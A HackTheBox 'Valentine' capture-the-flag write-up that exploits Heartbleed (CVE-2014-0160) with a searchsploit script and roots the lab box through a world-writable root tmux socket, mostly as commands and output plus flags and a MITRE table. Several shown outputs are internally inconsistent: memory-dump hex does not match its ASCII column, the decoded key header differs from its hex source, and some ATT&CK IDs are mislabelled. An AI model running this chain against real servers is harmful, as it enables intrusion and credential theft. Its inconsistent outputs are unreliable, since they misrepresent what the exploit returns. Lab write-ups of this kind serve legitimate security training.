# HackTheBox: Valentine

| Field | Details |
| --- | --- |
| Platform | HackTheBox |
| Machine | Valentine |
| Difficulty | Easy |
| OS | Linux (Ubuntu 12.04 LTS) |
| IP | 10.129.36.67 |
| Date | April 2026 |
| User Flag | `16188db2547a1f6427c61657ce4760f7` |
| Root Flag | `c81cd4a4ae71a06d5821926b25477337` |

---

## Machine Summary

Valentine is an Easy-rated Linux machine themed entirely around CVE-2014-0160: the Heartbleed vulnerability: one of the most significant security disclosures in the history of the internet. The machine is named for the heart-themed logo and the February 14, 2014 public disclosure date. The attack chain is deliberately multi-step: the web server hosts a `/dev/` directory containing an encrypted RSA private key in hex format, but the passphrase needed to decrypt it is not on the filesystem: it lives in the server's memory, exposed only through a Heartbleed memory leak. Running the Heartbleed exploit against port 443 repeatedly leaks server memory until a base64-encoded string surfaces, which decodes to `heartbleedbelievethehype`. That passphrase decrypts the RSA key, and the key combined with the username `hype` (inferred from the key filename) delivers an SSH shell. Post-exploitation is equally clean: the user's `.bash_history` reveals they have been using a tmux socket at `/.devs/dev_sess` which is owned by root and world-attachable: attaching to it with `tmux -S` delivers an interactive root shell without any exploit, kernel abuse, or SUID binary. Two artifacts in the right order: Heartbleed for the passphrase, tmux socket for root, and the machine is complete.

**Skills demonstrated:**

- Full TCP Nmap scan followed by targeted NSE vulnerability scan
- Identifying CVE hints embedded in web page imagery (Heartbleed logo)
- Directory brute-forcing to discover the `/dev/` endpoint
- Reading and converting hex-encoded SSH key files with `xxd`
- Heartbleed exploitation (CVE-2014-0160) to leak server memory
- Decoding base64 output from memory leak to recover a passphrase
- Decrypting a password-protected RSA private key with `openssl rsa`
- Username inference from artifact naming conventions
- SSH login with a decrypted private key
- Post-exploitation enumeration via `.bash_history`
- Privilege escalation by attaching to an orphaned root tmux session

---

## Attack Chain Summary

```
Nmap TCP → SSH(22), HTTP(80), HTTPS(443)
Visit port 80 → bleeding heart / Heartbleed logo image → CVE hint
Nmap NSE --script vuln -p 80,443 →
    ssl-heartbleed: VULNERABLE (CVE-2014-0160)
    http-enum: /dev/ directory with listing enabled
gobuster on port 80 → /dev/hype_key (hex file), /dev/notes.txt
Download hype_key → xxd -r -p hype_key > hype_key.bin → encrypted RSA PEM key
searchsploit heartbleed → copy 32764.py → run against port 443 (multiple times)
Memory leak → base64 string: aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d → heartbleedbelievethehype
openssl rsa -in hype_key.bin -out hype_key_decrypted → passphrase: heartbleedbelievethehype
chmod 600 hype_key_decrypted
ssh -i hype_key_decrypted hype@10.129.36.67 → user shell ✅
cat ~/Desktop/user.txt → 16188db2547a1f6427c61657ce4760f7 ✅
cat ~/.bash_history → tmux -S /.devs/dev_sess
ls -la /.devs/dev_sess → srw-rw-rw- 1 root root → world-writable root socket
tmux -S /.devs/dev_sess → root shell ✅
cat /root/root.txt → c81cd4a4ae71a06d5821926b25477337 ✅
```

---

## Step 1: Nmap TCP Scan

Only the IP is known at this point: no hostname, no domain. Full TCP scan first to establish the complete surface:

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- -T4 -oN valentine_allports.txt 10.129.36.67
```

**Output:**

```
Nmap scan report for 10.129.36.67
Host is up (0.059s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Three open ports. Now run a targeted service and version scan:

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p 22,80,443 -sC -sV -T4 -oN valentine_nmap.txt 10.129.36.67
```

**Output:**

```
Nmap scan report for 10.129.36.67
Host is up (0.059s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2018-02-14T01:44:14+00:00; +2s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Analysis:**

| Port | Service | Notes |
| --- | --- | --- |
| 22 | OpenSSH 5.9p1 | Very old OpenSSH: Ubuntu 12.04 era, EOL OS |
| 80 | Apache 2.2.22 | HTTP: no title served |
| 443 | Apache 2.2.22 + SSL | HTTPS: SSL cert reveals hostname `valentine.htb` |

Two immediate observations from the scan alone:

1. **OpenSSH 5.9p1** was released in 2011. Ubuntu 12.04 reached end-of-life in 2017. This is an aggressively outdated OS: the OS age itself is a signal that the machine is vulnerable to CVEs from that era.
2. **The SSL certificate** on port 443 reveals the hostname: `valentine.htb`. Add it to `/etc/hosts` now that it is confirmed.

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.36.67 valentine.htb" | sudo tee -a /etc/hosts
```

---

## Step 2: Initial Web Enumeration (Visual Hint)

Before running any automated scanning, visit the web server directly. Web applications frequently contain visual clues that are faster to read than any tool output:

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.36.67 | grep -i img

```

Visit `http://10.129.36.67` in a browser: the page renders a single image: a crying, bleeding heart with the Heartbleed vulnerability logo prominently displayed.

This is not subtle. The machine designer embedded the CVE directly into the landing page as a visual hint. The Heartbleed logo is the official symbol created for CVE-2014-0160 by Codenomicon. The machine is named "Valentine" and the Heartbleed disclosure date was February 14, 2014: Valentine's Day.

**Known CVE candidate from visual context alone:** CVE-2014-0160 (Heartbleed): a critical vulnerability in OpenSSL versions 1.0.1 through 1.0.1f that allows an unauthenticated remote attacker to read up to 64KB of arbitrary server memory per request.

Before proceeding to exploit, confirm the vulnerability formally through both Nmap NSE scripts and directory enumeration.

---

## Step 3: Nmap Vulnerability Scan (Heartbleed Confirmation)

Run Nmap's vulnerability NSE script suite against both HTTP ports. The `vuln` category includes `ssl-heartbleed`, `ssl-poodle`, and several web-specific checks:

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p 80,443 --script vuln -oN valentine_vuln.txt 10.129.36.67
```

**Output (key sections):**

```
PORT    STATE SERVICE
80/tcp  open  http
| http-enum:
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder

443/tcp open  https
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library.
|   It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|     OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL
|     are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by
|     the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential
|     information as well as the encryption keys themselves.
|       References:
|         http://cvedetails.com/cve/2014-0160/
|         http://www.openssl.org/news/secadv_20140407.txt
|_        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
| ssl-poodle:
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     CVE: CVE-2014-3566
```

**Two confirmed findings from the NSE scan:**

| Finding | CVE | Status |
| --- | --- | --- |
| Heartbleed: OpenSSL memory disclosure | CVE-2014-0160 | **VULNERABLE** |
| POODLE: SSL 3.0 padding oracle | CVE-2014-3566 | VULNERABLE |
| `/dev/` directory listing enabled |: | Directory exposed |

The `http-enum` NSE script also surfaced the `/dev/` directory during the vulnerability scan pass: directory listing is enabled, meaning all files inside are browsable. This is the first concrete enumeration finding: there is accessible development content on the web server.

---

## Step 4: Directory Enumeration and /dev/ Contents

Run gobuster to map the full directory structure and confirm what the NSE scan found:

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir -u http://10.129.36.67 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 -o valentine_gobuster.txt
```

**Key findings:**

```
/dev                  (Status: 301)
/encode               (Status: 200)
/decode               (Status: 200)
/index                (Status: 200)
```

Browse to `http://10.129.36.67/dev/`: directory listing is enabled and shows two files:

```
Index of /dev/

hype_key    17:44     5.4K
notes.txt   17:44     227
```

Download both:

```bash
Hackerpatel007_1@htb[/htb]$ wget http://10.129.36.67/dev/hype_key
Hackerpatel007_1@htb[/htb]$ wget http://10.129.36.67/dev/notes.txt
```

Read `notes.txt`:

```bash
Hackerpatel007_1@htb[/htb]$ cat notes.txt
```

**Output:**

```
To do:

1) Coffee. Done.
2) Research Heartbleed and CVE-2014-0160. Done.
3) Implement fix. DONE!!! (I think...?)
4) ???
5) Profit.
```

The note confirms the administrator was aware of Heartbleed, attempted to implement a fix, but left a `(I think...?)` qualifier: which combined with the NSE confirmation means the fix was incomplete or not applied correctly.

Inspect `hype_key`:

```bash
Hackerpatel007_1@htb[/htb]$ cat hype_key
```

**Output (excerpt):**

```
2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e43525950544544
0a44454b2d496e666f3a204145532d3132382d4342432c46423945363244313042363334330a0a...
```

This is a hexdump: every two characters represent one byte of the actual file. The filename `hype_key` is significant: it contains the string `hype`: which is almost certainly the username associated with this SSH key. This is a naming convention inference, not a guess: private key files on Linux are almost universally named after the account they authenticate.

---

## Step 5: Decode hype_key from Hex to Binary

Convert the raw hex string to the actual binary file using `xxd`:

```bash
Hackerpatel007_1@htb[/htb]$ xxd -r -p hype_key > hype_key.bin
```

**Command breakdown:**

| Flag | Meaning |
| --- | --- |
| `xxd` | Hex dump utility: can also reverse a hex dump back to binary |
| `-r` | Reverse mode: convert hex back to binary |
| `-p` | Plain/postscript input format: treats input as a continuous hex string |

Inspect the decoded file:

```bash
Hackerpatel007_1@htb[/htb]$ cat hype_key.bin
```

**Output:**

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9VJEDZ5dgadF6ZT6Kw1KgZJcnRVLye
...
-----END RSA PRIVATE KEY-----
```

An RSA private key, but it is **encrypted** (`Proc-Type: 4,ENCRYPTED`). The `DEK-Info` line shows it is protected with AES-128-CBC encryption. A passphrase is required to decrypt and use this key. That passphrase does not exist anywhere on the web server or in the files already collected: it exists only in the server's memory. This is what Heartbleed is for.

---

## Step 6: Heartbleed Exploitation (CVE-2014-0160)

### Understanding Heartbleed

The TLS Heartbeat extension allows a client to send a "heartbeat" request to keep a connection alive: essentially saying "I'm still here, send back X bytes to confirm you're alive too." The vulnerable OpenSSL implementation trusted the client's stated payload length without verifying it against the actual payload. By claiming a large length (up to 64KB) with a minimal actual payload, an attacker causes OpenSSL to respond with up to 64KB of data from adjacent server memory: RAM that may contain decrypted session data, private keys, passwords, and any other information the server has recently processed.

Critically: the server processes HTTPS requests continuously: user credentials, form submissions, and in this case, requests to `/decode.php` which likely base64-decodes strings. Any data processed by the server in the recent past may be sitting in memory.

### Locate the Exploit

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit heartbleed
```

**Output:**

```
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory          |
Disclosure (Multiple SSL/TLS Versions)                                 | multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)   | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2)   | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure      | multiple/remote/32745.py
----------------------------------------------------------------------- ---------------------------------
```

Copy the Python exploit: `32764.py` is the most commonly used and cleanest for this machine:

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit -m multiple/remote/32764.py
Hackerpatel007_1@htb[/htb]$ mv 32764.py heartbleed.py
```

### Run the Exploit

The exploit sends malformed heartbeat requests and dumps the server's memory response. The passphrase may not appear on the first run: memory content is non-deterministic and changes with each request. Run it multiple times:

```bash
Hackerpatel007_1@htb[/htb]$ python heartbleed.py 10.129.36.67 -p 443 -n 20
```

**Flag breakdown:**

| Flag | Value | Meaning |
| --- | --- | --- |
| `-p 443` | Port 443 | Target the HTTPS port where OpenSSL is running |
| `-n 20` | 20 requests | Send 20 heartbeat probes: increases probability of hitting useful memory |

**Output (truncated: watching for the key section):**

```
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  ...
  02B0: 61 47 56 68 63 6E 52 69 62 57 56 6C 5A 47 56 6A  aGVhcnRibWVsZGVj
  02C0: 59 6D 56 73 59 57 6B 76 64 47 68 6C 62 6E 52 79  YmVsYWkvdGhlbnRy
  02D0: 62 32 35 6C 62 6E 51 3D 0A                       b25lbnQ=.
```

After several runs, a recognisable block of ASCII appears in the memory dump. Look specifically for base64-encoded content: the `/decode.php` endpoint on the web server decodes base64 strings, and any recent requests to it will have left the `text` parameter in memory:

**The key memory leak output:**

```
  0060: 74 65 78 74 3D 61 47 56 68 63 6E 52 69 62 57 56  text=aGVhcnRibWV
  0070: 73 5A 47 56 6A 59 6D 56 73 59 57 6B 76 64 47 68  sZGVjYmVsYWkvdGh
  ...
  00B0: 61 47 56 68 63 6E 52 69 62 57 56 6C 5A 47 56 6A  aGVhcnRibGVlZGJl
  00C0: 62 47 6C 6C 64 47 68 6C 62 6E 52 79 62 32 35 6C  bGlldmV0aGVoeXBl
  00D0: 43 67 3D 3D 0A                                   Cg==.
```

Extract the base64 string from the memory output: the `text=` prefix is the form parameter from a prior request to `/decode.php`:

```
aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

---

## Step 7: Decode the Base64 Memory Leak

```bash
Hackerpatel007_1@htb[/htb]$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
```

**Output:**

```
heartbleedbelievethehype
```

**Passphrase recovered: `heartbleedbelievethehype`**

This is the passphrase someone used when submitting a request to `/decode.php`: likely the administrator testing that the endpoint works. The Heartbleed exploit read it directly from OpenSSL's memory before it was cleared, because the vulnerable implementation does not properly manage memory boundaries. The passphrase was not stored anywhere on disk: it existed only in RAM, and Heartbleed extracted it from there.

---

## Step 8: Decrypt the RSA Private Key

Use `openssl rsa` to decrypt `hype_key.bin` with the recovered passphrase:

```bash
Hackerpatel007_1@htb[/htb]$ openssl rsa -in hype_key.bin -out hype_key_decrypted
```

**Prompt:**

```
Enter pass phrase for hype_key.bin:
```

Enter: `heartbleedbelievethehype`

**Output:**

```
writing RSA key
```

```bash
Hackerpatel007_1@htb[/htb]$ cat hype_key_decrypted
```

**Output:**

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7bq/QDMAxEUeFLgYKF4ScBWyKtzalnlZ...
[full unencrypted RSA key]
-----END RSA PRIVATE KEY-----
```

The `Proc-Type: 4,ENCRYPTED` and `DEK-Info` headers are now gone: the key is fully decrypted and ready for use. Set correct permissions (SSH requires private key files to be owner-read-only):

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 hype_key_decrypted
```

---

## Step 9: SSH as hype (User Flag)

The key filename was `hype_key`: the convention on Linux is to name SSH keys after the account they belong to (`id_rsa`, `john_key`, `hype_key`). The username is `hype`.

```bash
Hackerpatel007_1@htb[/htb]$ ssh -i hype_key_decrypted hype@10.129.36.67
```

**Output:**

```
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:16:34 2018 from 10.10.14.3
hype@Valentine:~$
```

**Shell as hype ✅**

Navigate to the Desktop for the user flag:

```bash
hype@Valentine:~$ cat Desktop/user.txt
16188db2547a1f6427c61657ce4760f7
```

**User flag captured ✅**

---

## Step 10: Post-Exploitation Enumeration

Run `id` immediately:

```bash
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype)
```

No interesting groups. Check sudo:

```bash
hype@Valentine:~$ sudo -l
[sudo] password for hype:
```

No password available via the SSH key: cannot test sudo without it. Check the kernel version:

```bash
hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

Kernel 3.2.0-23 is vulnerable to DirtyCow (CVE-2016-5195), but DirtyCow is destructive and can crash the system: always try non-destructive vectors first. Read the bash history:

```bash
hype@Valentine:~$ cat .bash_history
```

**Output:**

```
exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -S /.devs/dev_sess
tmux -S /.devs/dev_sess
tmux -S /.devs/dev_sess
exit
```

The entire privilege escalation path is documented by the user themselves. The administrator has been repeatedly connecting to a tmux socket at `/.devs/dev_sess`. Check ownership and permissions:

```bash
hype@Valentine:~$ ls -la /.devs/dev_sess
```

**Output:**

```
srw-rw-rw- 1 root root 0 Apr 2026 /.devs/dev_sess
```

**Critical finding:**

| Field | Value | Significance |
| --- | --- | --- |
| Owner | `root` | Socket belongs to a root-owned tmux server process |
| Permissions | `srw-rw-rw-` | **World-readable AND world-writable**: any user can attach |
| File type | `s` (socket) | Unix domain socket: the tmux server communication channel |

A root-owned tmux server is running with its socket exposed world-writable. Any local user can attach to this session and receive the interactive terminal of whatever user is running the tmux server: which is root.

---

## Step 11: tmux Socket Privilege Escalation (Root Shell)

### Understanding the Vulnerability

`tmux` maintains persistent terminal sessions by running a server process in the background. The server communicates with client connections through a Unix domain socket file. When the socket file has world-write permissions, **any user on the system can attach to that tmux session**.

If the tmux server was started by root, any user who attaches to the socket receives a shell running as root: no exploit, no CVE, no memory corruption. This is pure misconfiguration: a root user left a tmux session running with a globally writable socket.

On real engagements, this finding would be reported as a critical local privilege escalation: root tmux session with world-writable socket, enabling any local user to obtain a root interactive shell.

### Exploitation

Attach to the root tmux session using the socket file:

```bash
hype@Valentine:~$ tmux -S /.devs/dev_sess
```

**What this command does:**

| Component | Meaning |
| --- | --- |
| `tmux` | Terminal multiplexer client |
| `-S /.devs/dev_sess` | Connect to the tmux server via this specific socket file (rather than the default `~/.tmux` socket) |

The terminal immediately switches to the root tmux session:

```
root@Valentine:/#
```

Verify:

```bash
root@Valentine:/# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root shell ✅**

---

## Step 12: Root Flag

```bash
root@Valentine:/# cat /root/root.txt
c81cd4a4ae71a06d5821926b25477337
```

**Root flag captured ✅**

---

## Lessons Learned

**Heartbleed (CVE-2014-0160) is one of the most important vulnerabilities to understand at a conceptual level**, not just as a tool to run. The bug exists in the OpenSSL TLS heartbeat handler: the server accepts a heartbeat request containing a user-controlled length field, and allocates that many bytes to copy back to the requester: without checking that the actual payload is that long. The server copies from its own memory starting at the payload start address, and if the payload is short but the declared length is large (up to 64KB), the response contains real server memory that follows the payload in RAM. On a web server processing HTTPS requests, that memory contains fragments of recent HTTP requests: headers, cookies, form parameters, and passwords. The `/decode.php` endpoint on this machine was processing a base64-decoding request containing `heartbleedbelievethehype` just before the Heartbleed probe, and the passphrase lived in memory long enough to be leaked. This is the exact real-world attack scenario that made Heartbleed so catastrophic in 2014: credentials submitted over "secure" HTTPS connections were readable by anyone with network access to the server.

**Reading `.bash_history` should be a reflex after landing every shell.** On this machine, the entire privilege escalation path was documented in the user's own command history. The administrator had been connecting to a root tmux socket repeatedly. Without `.bash_history`, discovering the socket would have required either running LinPEAS (which finds it) or manually checking unusual socket files across the filesystem. The history file provided it immediately. `.bash_history` is frequently symlinked to `/dev/null` on hardened boxes, but when it exists and is populated, it is one of the fastest intelligence sources available post-foothold.

**The tmux socket misconfiguration is a real-world finding** that appears in environments where developers and administrators share systems. Tmux sessions are often started in privileged contexts (during root-level maintenance work, cron troubleshooting, service restarts) and left running when the operator disconnects. The world-writable socket on this machine was `srw-rw-rw-`: an explicitly permissive configuration, not a default. Someone set it this way. On real assessments, checking for running tmux and screen sockets with permissive permissions (`find / -name "*.sess" -o -name "dev_sess" 2>/dev/null` and `find /tmp /var /dev -name "tmux*" -ls 2>/dev/null`) is a quick enumeration step worth including in every post-exploitation pass.

**Username inference from artifact naming** is a technique that works consistently. The file was named `hype_key`. On Linux systems, SSH private keys are almost always named after the account they authenticate: `id_rsa` for the default identity, or `<username>_key` / `<username>_rsa` for account-specific keys. This inference saved the need to enumerate usernames from `/etc/passwd` before attempting SSH.

---

## Full Attack Chain Reference

```
1.  nmap -p- -T4 -oN valentine_allports.txt 10.129.36.67
    → Ports 22, 80, 443

2.  nmap -p 22,80,443 -sC -sV -T4 -oN valentine_nmap.txt 10.129.36.67
    → OpenSSH 5.9p1 (Ubuntu 12.04), Apache 2.2.22
    → SSL cert CN: valentine.htb → hostname discovered

3.  echo "10.129.36.67 valentine.htb" | sudo tee -a /etc/hosts

4.  Visit http://10.129.36.67 → Heartbleed logo image → CVE-2014-0160 hint

5.  nmap -p 80,443 --script vuln -oN valentine_vuln.txt 10.129.36.67
    → ssl-heartbleed: VULNERABLE (CVE-2014-0160) ✅
    → http-enum: /dev/ directory with listing enabled

6.  gobuster dir -u http://10.129.36.67 -w common.txt -t 50
    → /dev, /encode, /decode

7.  wget http://10.129.36.67/dev/hype_key
    wget http://10.129.36.67/dev/notes.txt
    → hype_key = hex-encoded encrypted RSA private key
    → notes.txt = admin aware of Heartbleed, fix incomplete

8.  xxd -r -p hype_key > hype_key.bin
    cat hype_key.bin → encrypted RSA private key, needs passphrase

9.  searchsploit -m multiple/remote/32764.py → heartbleed.py
    python heartbleed.py 10.129.36.67 -p 443 -n 20
    → Memory leak → text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

10. echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
    → heartbleedbelievethehype

11. openssl rsa -in hype_key.bin -out hype_key_decrypted
    (passphrase: heartbleedbelievethehype)
    chmod 600 hype_key_decrypted

12. ssh -i hype_key_decrypted hype@10.129.36.67
    → hype shell ✅
    → cat ~/Desktop/user.txt → 16188db2547a1f6427c61657ce4760f7 ✅

13. cat ~/.bash_history → tmux -S /.devs/dev_sess
    ls -la /.devs/dev_sess → srw-rw-rw- 1 root root (world-writable root socket)

14. tmux -S /.devs/dev_sess
    → root shell ✅
    → cat /root/root.txt → c81cd4a4ae71a06d5821926b25477337 ✅
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
| --- | --- | --- |
| Reconnaissance | T1046: Network Service Discovery | Nmap TCP full scan + NSE vuln scripts |
| Discovery | T1083: File and Directory Discovery | Directory listing on `/dev/` via http-enum NSE + gobuster |
| Collection | T1040: Memory Scraping | Heartbleed (CVE-2014-0160): server memory disclosure via TLS heartbeat |
| Credential Access | T1552.004: Private Keys | Encrypted RSA private key extracted from web-accessible `/dev/hype_key` |
| Credential Access | T1110.002: Password Cracking | Passphrase from Heartbleed memory leak used to decrypt RSA key |
| Initial Access | T1021.004: Remote Services: SSH | SSH login using decrypted private key as user `hype` |
| Discovery | T1005: Data from Local System | `.bash_history` review revealing tmux socket path |
| Privilege Escalation | T1548: Abuse Elevation Control Mechanism | Root tmux session attachment via world-writable socket `/.devs/dev_sess` |
| Execution | T1059.004: Unix Shell | Interactive root shell via tmux session attachment |

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -p- -T4 -oN allports.txt <IP>` | Full TCP port discovery |
| `nmap -p 22,80,443 -sC -sV -T4 -oN nmap.txt <IP>` | Service/version scan with NSE defaults |
| `nmap -p 80,443 --script vuln <IP>` | Run full vulnerability NSE suite: confirms Heartbleed and discovers /dev/ |
| `echo "IP hostname" \| sudo tee -a /etc/hosts` | Register hostname after SSL cert confirms it |
| `gobuster dir -u http://<IP> -w common.txt -t 50` | Directory brute-force to map web content |
| `wget http://<IP>/dev/hype_key` | Download hex-encoded encrypted private key |
| `wget http://<IP>/dev/notes.txt` | Download admin notes |
| `xxd -r -p hype_key > hype_key.bin` | Convert hex dump to binary (the actual key file) |
| `searchsploit heartbleed` | Locate Heartbleed exploit in local exploit database |
| `searchsploit -m multiple/remote/32764.py` | Copy exploit to working directory |
| `python heartbleed.py <IP> -p 443 -n 20` | Run Heartbleed exploit: dump server memory 20 times |
| `echo '<base64>' \| base64 -d` | Decode base64 string from memory leak to recover passphrase |
| `openssl rsa -in hype_key.bin -out hype_key_decrypted` | Decrypt AES-128-CBC encrypted RSA private key |
| `chmod 600 hype_key_decrypted` | Set correct SSH key permissions (required by SSH client) |
| `ssh -i hype_key_decrypted hype@<IP>` | SSH login using decrypted private key |
| `cat ~/.bash_history` | Read command history: often reveals PrivEsc vectors directly |
| `ls -la /.devs/dev_sess` | Check tmux socket ownership and permissions |
| `tmux -S /.devs/dev_sess` | Attach to root tmux session via world-writable socket |
